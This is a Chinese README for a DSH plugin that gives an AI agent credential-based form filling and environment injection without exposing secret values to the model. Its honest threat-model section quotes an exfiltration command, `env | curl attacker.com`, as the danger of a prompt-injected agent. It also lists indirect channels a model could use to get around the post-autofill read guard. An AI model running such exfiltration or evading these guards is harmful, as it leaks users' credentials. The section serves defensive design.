# dsh-accounts

DSH（DeepSeek Harness）凭据桥接插件：让 DSH 里的 AI 从凭据存储（credentials-local）读取账号（用户名/密码/API key/TOTP），值**只在插件进程内存中流转**，用于：

- **(a) 浏览器代填登录表单** —— `account_fill` 工具把账号值直接注入内置浏览器的输入框；
- **(b) env 注入运行本地 CLI** —— `credential_run` 工具把 API key/token 以环境变量注入子进程。

此外提供**网页管理界面**（`/dsh-accounts/`，见下方「管理页」节），供用户本人增删改查账号。

模型与对话只能看到**账号名字与元数据**，永远看不到值。

零运行时依赖：仅用 `node:` 内置模块，不 import 任何 `@deepseek-ai/*` 包（DSH 服务全部从 `apply(ctx, config)` 的 `ctx` 获取）。

## 安装

要求 DSH >= 0.1.1-rc.1（web profile）。

### 方式一：官方插件命令（推荐）

```bash
dsh plugin --profile web add github:yangwuan55/dsh-accounts
```

一条命令完成全部注册：pnpm 从 GitHub 拉包装进 profile，并自动把 `dsh-accounts` 加进 `dsh.profile.bundles`（CLI 的 reconcile 逻辑：声明了 `dsh.bundle` 的依赖自动加入 layer 栈）。然后重启 DSH web 即可。

### 方式二：本地开发安装（改源码场景）

```bash
git clone https://github.com/yangwuan55/dsh-accounts.git ~/.dsh/plugins/dsh-accounts
dsh plugin --profile web add link:~/.dsh/plugins/dsh-accounts
```

`link:` 规格让 pnpm 以软链安装（源码改动无需重新拉包，重启 DSH 生效）。

### 校验

```bash
dsh --profile web --dump-config | grep dsh-accounts
# 应看到 dsh-accounts / dsh-accounts-fill / dsh-accounts-manage 三条 entry
```

重启后，web profile 下有两种录入入口：**设置面板 →「账号」**（推荐，原生界面），或浏览器打开 `http://127.0.0.1:3080/dsh-accounts/`（独立管理页）。headless profile 用法与注意事项见「部署形态」节。

## 模型可见工具

| 工具 | 参数 | 返回 |
|---|---|---|
| `account_list` | 无 | `{ accounts: [{ id, kind, label?, hasTotp, domains? }], invalid?: [{ id, error }] }` |
| `account_fill` | `{ account, mapping: [{ selector, field }], submit?: { selector?, key?: 'Enter' } }` | `{ filled: [selector…], failed?: [{ selector, reason }], submitted, challenge?: 'needs-human' }` |
| `credential_run` | `{ account, command, args?, envKeys?, timeoutMs? }` | `{ exitCode, stdout, stderr, timedOut? }`（输出已脱敏） |

三个工具的返回值与错误路径**均不含任何值本身**，只有账号 id、字段名（键名）、CSS 选择器等元数据。

`field` 可用 `username` / `password` / `totp`（现算 RFC 6238 验证码）或账号 `fields` 里的自定义键。

## 账号协议（records payload schema）

账号真源 = `~/.dsh/.credentials.yaml` 的 `records:` 空间里 scope 为 `dsh-accounts` 的 **grant 记录**。文件 IO、0600/0700 权限、热重载、写锁都由 credentials-local 负责，本插件只读（绝不调用 set/unset/modifyRecord/deleteRecord）。

```
payload = {
  kind: 'account' | 'env' | 'secret',   # 必填，三选一
  label?: string,                        # 人类可读描述（模型可见）
  domains?: string[],                    # host 后缀白名单，如 ['github.com']；account_fill 用
  fields?: { username?, password?, totpSecret?, [custom: string]: string },  # account 主体；值全为非空 string
  env?: { [VAR: string]: string },       # credential_run 的注入源（任意 kind 都可声明，credential_run 只认这里的键）
  value?: string,                        # 仅 kind='secret'，非空 string
}
```

严格校验（读取时执行，未知字段/非法 kind **报错不静默**）：

- payload 必须是普通对象且过 JSON 往返等价；
- `kind` 必填三选一；`account` 必须有非空 `fields`（值全为非空 string）；`secret` 必须有非空 `value`；`env` 必须有 `env` 映射且键匹配 `/^[A-Za-z_][A-Za-z0-9_]*$/`、值非空 string；
- `domains` 每项为合法 host 片段（小写字母数字与点和连字符，不以 `-`/`.` 开头结尾，无连续点）；
- 未知顶层字段抛错——错误信息只含字段名与账号 id，**绝不含值本身**；
- `totpSecret` 存在时摘要里标 `hasTotp: true`。

### credential_run 注入规则

**只有账号 `env` 映射里声明的键可被注入**（注入名 = env 键的实际名字）：

- `envKeys` 缺省 → 注入该账号全部 env 键；
- `envKeys` 给定 → 只注入交集里的键；无交集 → 结构化报错，列出该账号可注入的键名（仅键名）；
- 账号没有 `env` 映射（包括 kind='secret' 只带 value 的情况）→ 结构化报错，列出可注入键（空）。

不会把 `fields` 里的键名「自作聪明」映射成大写环境变量——映射关系必须由账号记录的 `env` 显式声明。

## 账号录入步骤

**方式一：设置面板「账号」区（推荐，web profile 下）** —— 重启 dsh web 后打开「设置 → 账号」。分区用 DSH 原生组件渲染，增删改查、域名白名单、字段值（默认打码，可临时显示）都在这里完成，保存即写入 credentials。

**方式二：管理页** —— 打开 `http://127.0.0.1:3080/dsh-accounts/`，同一套 API 的独立页面（脚本友好、可直连 curl）。详见「管理页」节。两者并存，改哪个都会立刻反映到另一个。

**方式三：手工编辑 YAML**：

1. 编辑 `~/.dsh/.credentials.yaml`（credentials-local 托管，0600），在 `records:` 段追加 grant 记录。示例（全部假值）：

```yaml
records:
  dsh-accounts/github-main:
    kind: grant
    payload:
      kind: account
      label: GitHub 主账号
      domains: [github.com]
      fields:
        username: you@example.com
        password: <你的密码>
        totpSecret: <Base32 TOTP 密钥，可选>
  dsh-accounts/vercel-cli:
    kind: grant
    payload:
      kind: env
      label: Vercel CLI 令牌
      env:
        VERCEL_TOKEN: <你的 token>
```

> ⚠️ **记录级 `kind` 只有 `api-key` | `grant` 两种**——账号协议里的 `account`/`env`/`secret` 是 **payload 级** 的 `kind`，必须写在 `payload:` 嵌套层下面；写在记录级会被 credentials-local 启动即报错。

2. 保存即可——credentials-local 热重载并广播 `credentials/record-updated`，本插件监听该事件做缓存失效，无需重启。
3. 对话里让 AI 调 `account_list` 确认识别到了（只显示 id/label/hasTotp/domains，不显示值）。

**注意**：id 必须以 `dsh-accounts/` 为 scope 前缀，id 段匹配 `^[a-z][a-z0-9-]*$`（如 `github-main`）。文件权限与格式由 credentials-local 保证，不要手工改坏 YAML 结构。

## Config（apply 第二参，全部可选）

```js
{ armedWindowMs?: number,   // 代填后武装窗口时长，默认 120000（毫秒）
  runTimeoutMs?: number,    // credential_run 默认超时，默认 60000（SIGTERM 后 2s SIGKILL）
  maxOutputChars?: number } // credential_run stdout/stderr 截断上限，默认 50000（超出截断并注明）
```

## 管理页（网页管理界面）

浏览器打开 **http://127.0.0.1:3080/dsh-accounts/** 即可增删改查账号（单文件页面，挂在 DSH webServer 上，无外链资源）。

功能：

- 账号卡片列表：id、kind 徽标、label、TOTP/域名标记；解析失败的记录显示 error 并标 invalid；
- 新建账号表单：id（小写自动 + 段语法提示）、kind 三选一（account / env / secret，联动显示 fields/env/value 区块）、fields 与 env 键值行动态增删、domains 逗号分隔、label；
- 每张卡片可「编辑」（预填完整 payload）与「删除」（confirm 后执行，不存在为 no-op）；
- 密码/token 输入框默认 `<input type="password">` 打码，眼睛按钮（内联 SVG）切换明文回显——**该页面向用户本人回显值，属于与官方 `/api` 相同的信任级**；模型与对话依旧永远看不到值；
- 保存 = `PUT`（同名即覆盖，编辑态有"将覆盖现有值"提示）；成功 toast、失败显示 API 返回的字段级错误消息；
- 顶部 toast 展示操作结果；暗色主题与 DSH GUI 谐调。

### 信任级与围栏

- **只写不读是工具层的纪律，管理页是用户本人的回显界面**：`GET /api/accounts/:id` 返回完整 payload 含值（编辑预填需要），`PUT` 直接写 credentials。这与 DSH 官方 web API（可读写全部凭据）的信任级一致，前提都是"用户本人的本机浏览器"。
- 只有 `/api/*` 做 browser-trust 围栏（语义照抄 DSH 官方 `client/connection` 的 api-request-trust，静态 HTML 不围栏——无值无危险）：
  1. **Host fence**：`Host` 头必须存在且 hostname 是 loopback（`localhost`、`*.localhost`、`127.0.0.0/8`、`::1`、`[::1]`），否则拒绝——防 DNS-rebinding，无 marker 捷径；
  2. **Sec-Fetch-Site**：`sec-fetch-site: cross-site` → 拒绝；
  3. **Origin 同源**：带 `origin` 头时必须与请求 Host 完全同源（scheme+host+port 规范化，默认端口省略等价）；`origin: null`（沙箱 iframe / file:）拒绝；无 origin 头可以（Host fence 已绑定请求）；
  4. 不通过 → `403` 纯文本。
- **写能力探测**：`GET /api/capabilities` 返回 `canWrite`（`listRecords` 与 `modifyRecord` 都可用才算可写）。`canWrite=false` 时页面禁用新建/编辑/删除并显示只读横幅。探测是最诚实的形态——不做真实写探测；若运行时写入仍被拒，写接口返回 `{ error }`，页面 toast 展示。
- 错误路径不回显值：校验错误只含字段路径与账号 id；日志只记 id 与字符长度，不打印 body。

### 关闭管理页

Config 传 `{ enabled: false }` 即不注册路由：

```js
// bundle patch 的 config 或 loader 配置里
{ enabled: false }
```

headless profile 无需配置——`dsh-accounts/manage` inject 含 `webServer`，headless 无该服务时**静默不加载**，管理页自然缺席。

### 重启后验证清单

用户重启 DSH web 后逐条验证：

1. 打开 http://127.0.0.1:3080/dsh-accounts/ —— 页面正常渲染（暗色主题、账号卡片）；
2. 看到 2 个测试账号卡片（元数据与预期一致，invalid 记录带 error）；
3. 新建一个假账号（如 id `test-managed`，kind=secret，随便一个值）——保存出现成功 toast，列表出现新卡片；
4. 在 DSH 对话里调 `account_list` —— 应看到 `test-managed`（只显示元数据，无值）；
5. 回管理页删除 `test-managed` —— confirm 后卡片消失；
6. 从另一台机器 IP 访问 `http://<本机IP>:3080/dsh-accounts/api/accounts` —— 应被 403 拒绝（非 loopback Host）。

## 安全模型

### 守住的（值不进模型可见面）

- **参数**：`account_fill` / `credential_run` 的入参只有账号 id 与选择器/键名，没有值。
- **结果**：三个工具的返回值（成功与失败路径）只含 id、字段名、选择器、退出码、脱敏后输出；填充用真值只在插件内存 → 浏览器/子进程之间直接传递。
- **错误**：所有结构化错误文案都由插件拼装，只含元数据；`setValue` 等底层报错**不透传原文**（浏览器/系统错误可能回显值），一律替换为固定中文描述，原文只进 `ctx.logger`。校验类错误（如 Base32 非法字符）在源头就不回显输入。
- **脱敏**：`credential_run` 的 stdout/stderr 在返回前经脱敏器替换该账号所有秘密（env 值、fields 值、secret value、TOTP 现算码）为 `[REDACTED]`；spawn ENOENT 等错误也过脱敏（完整未脱敏版只进 `ctx.logger.error`）。
- **TOTP**：验证码现场计算、现场注入，不落盘、不进对话。

### 纵深防御

1. **domains 域白名单**：账号声明了 `domains` 时，`account_fill` 会比对当前 tab 的 URL host（精确或子域后缀匹配），不命中直接拒绝执行。白名单由账号记录显式声明，默认无域约束的账号在任何页面都可代填（录入时请务必给登录类账号声明 domains）。
2. **CAPTCHA 防线**：代填前先 `detectChallenge`，命中人机验证 → 一个字段都不填，返回 `{ challenge: 'needs-human' }`，请人工完成。
3. **武装窗口**：代填成功后 `arm(sessionId, armedWindowMs)`（默认 120 秒）。窗口内，guard 拦截 `browser_get_value` / `browser_execute` / `browser_a11y` / `browser_snapshot` / `browser_scrape`（常量表 `DEFAULT_BLOCKED_TOOLS`，运行时发现实际名称不同可调整），返回拒绝理由给模型。窗口按"任意会话"判定，宁枉勿纵；过期自动放行。即使 submit 结果未知也保持 armed——武装的意义就是防代填后直读。
4. **输出脱敏 + 截断**：子进程输出先脱敏再按 `maxOutputChars` 截断。
5. **短值跳过**：长度 < 4 的秘密不参与脱敏（避免灾难性误伤），跳过事实记日志（只记长度）。

### 守不住的（诚实声明）

- **同用户本地进程可读凭据文件**。账号明文存在 `~/.dsh/.credentials.yaml`（0600），任何以同一 OS 用户身份运行的进程（包括用户自己跑的 bash 命令）都能直接读它。这是 credentials-local 的固有边界，本插件无法收窄——见 credentials-local 自身的诚实声明。本插件只是保证**模型上下文**不接触值。
- **管理页的回显边界与官方 /api 相同**。管理页对本机用户回显值、允许写 credentials：浏览器扩展（可读本机页面 DOM）、本机恶意软件、以及任何能通过上述四条围栏的同用户进程（如直接 `curl http://127.0.0.1:3080/dsh-accounts/api/accounts/<id>`——Host/origin 头都可以伪造，围栏防的是浏览器侧的 cross-site/rebinding 场景，不是同用户进程）都能读到回显值。这与官方 `/api` 完全同边界，不是本插件引入的新缺口；管理页只是把用户自己在凭据文件里能看到的东西搬到了浏览器里。
- **browser 快照对 password 域的间接读取无法全封**。武装窗口拦的是已知读取类工具名单，不是能力边界：模型仍可能通过 `browser_click` 引发的页面跳转结果、表单校验报错文案（「密码错误」）、URL 中的 token、页面正文等**间接渠道**推断表单内容；`dsh-builtin-browser` 若新增读取类工具也不在名单内。武装窗口是纵深防御的一层，不是绝对防线。
- **被完全攻陷的 agent 无解**。若模型已被提示注入或其他方式完全控制，它可以调用 `credential_run` 执行 `env | curl attacker.com` 之类的外传命令——输出虽被脱敏，但秘密已经离开本机。插件层的脱敏拦不住「秘密合法地进入子进程后被子进程外传」。缓解：给敏感账号配 `domains` 白名单、用 `envKeys` 最小化注入、审计 `credential_run` 的调用日志。
- **回退自开浏览器会话（已知次优）**：`account_fill` 优先复用模型当前正在用的浏览器会话（通过 `dsh-builtin-browser/tool-browser` 的 `internals.sessions` 只读快照）；取不到（如该 agent 尚未开过会话）或包加载失败时，回退 `ctx.browser.open(taskKey)` 自开一个。浏览器 provider 不按 label 去重，回退会**新开一个会话**而不是复用——表现为「代填发生在一个新窗口」，属于已知次优，不是安全问题（域白名单与武装窗口照常生效），但用户体验上请在浏览器里找新开的窗口。另：当前页 URL 完全取不到时域白名单**降级放行并记日志**（防御缺口，记录在案）。

## 部署形态（web profile / headless profile）

cordis 的 inject 是硬门禁：apply 里访问未注入的服务（哪怕只是存在性检查）会抛 "cannot get property without inject"；而把 browser 放进 inject 又会让 headless（无 browser 服务）下整个插件永不加载。因此本包采用**同包三插件 + 一个浏览器半边**架构（cordis 原生语义，一个包三个加载入口，浏览器半边挂在核心入口所属的包上）：

| 入口 | name | inject | 注册内容 | headless 下 |
|---|---|---|---|---|
| `lib/index.js`（`exports["."]`） | `dsh-accounts` | `tools, credentials, systemPrompt` | `account_list`、`credential_run`、guard、systemPrompt 指南 | ✅ 正常加载 |
| `lib/fill-plugin.js`（`exports["./fill"]`） | `dsh-accounts/fill` | `tools, credentials, browser` | `account_fill` | ⏭️ 静默不加载（browser 缺失），`account_fill` 自然缺席 |
| `lib/manage.js`（`exports["./manage"]`） | `dsh-accounts/manage` | `credentials, webServer` | `/dsh-accounts` 前缀路由（管理页 + API） | ⏭️ 静默不加载（webServer 缺失），管理页自然缺席 |
| `lib/settings-ui.js`（`exports["./client"]`） | `dsh-accounts`（浏览器半边） | 客户端侧：`slots` | 设置面板「账号」分区 | ⏭️ 不适用（`dsh.client.platform = web`，headless 无 Web 外壳） |

- **headless 可用**：`account_list`、`credential_run`、guard（headless 永远无武装窗口，读取类工具自然放行）、prompt 指南。
- **web 全量**：三个插件都加载，`account_fill`、管理页 `/dsh-accounts/` 与设置面板「账号」区都可用。
- 浏览器半边（`lib/settings-ui.js`）是 DSH 客户端模块系统的 bundle（经典脚本 + `window.__ModuleLoader__.load`），依赖经 platform module 表解析：只用 `react` 与 `@deepseek-ai/dsh-client-ui-primitives`，**不新增任何 package 依赖，也不需要构建步骤**。它不发凭据请求之外的东西：读写都走本包 `/dsh-accounts/api`，账号值只在该次同源 fetch 中往返，不进模型上下文。
- 三个插件通过 `guard.js` 的模块级单例 `getArmRegistry()` 共享武装窗口注册表（同一 node 进程模块缓存保证恒等）：guard 在核心插件注册，arm 在代填插件的代填成功路径调用。
- 三个插件各自持有独立的 accounts 服务实例（无状态只读，互不影响）。
- 管理页写路径直接走 `credentials.modifyRecord` / `deleteRecord`（用户本人操作），不经 accounts 服务；工具层保持只读纪律不变。

## 开发

```bash
cd ~/.dsh/plugins/dsh-accounts
node --test test/*.test.mjs   # 单测（104 个：含 RFC 6238 附录 B 向量、三插件注册面、跨插件武装窗口、管理页围栏与管理 API）
node --check lib/index.js     # 语法检查（对每个 lib/*.js）
```

加载注册由 `cordis.patch.yml` 提供（bundle patch 三条 loader entry：`dsh-accounts`、`dsh-accounts-fill`、`dsh-accounts-manage`，需列入 profile 的 package.json bundles 并软链插件目录）。测试全部使用假值（如公开示例 Base32 `JBSWY3DPEHPK3PXP` 与 RFC 6238 附录 B 公开向量），不含任何真实凭据。
